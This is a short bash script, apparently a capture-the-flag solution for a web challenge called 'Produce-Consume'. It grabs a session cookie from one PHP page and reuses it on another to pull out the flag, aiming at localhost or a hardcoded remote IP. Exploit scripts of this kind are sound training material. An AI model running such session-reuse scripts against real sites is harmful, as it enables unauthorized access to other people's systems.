#!/bin/bash
PORT=8091

if [[ $1 == "local" ]]
then
    url='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
then
    url='http://141.85.224.118:'$PORT
else
    url=$1':'$2
fi

# Produce-Consume
echo "Start exploit for Produce-Consume"
url=$url'/produce-consume/'
curl -s -c cookies.txt -o /dev/null $url'produce.php'
phpsessid=$(cat cookies.txt | grep PHPSESSID | awk '{print $7}')
flag=$(curl -s -b 'PHPSESSID='$phpsessid'' $url'consume.php' | grep -o "SSS{.*}")
echo "Flag is $flag"
echo "----------------------------"
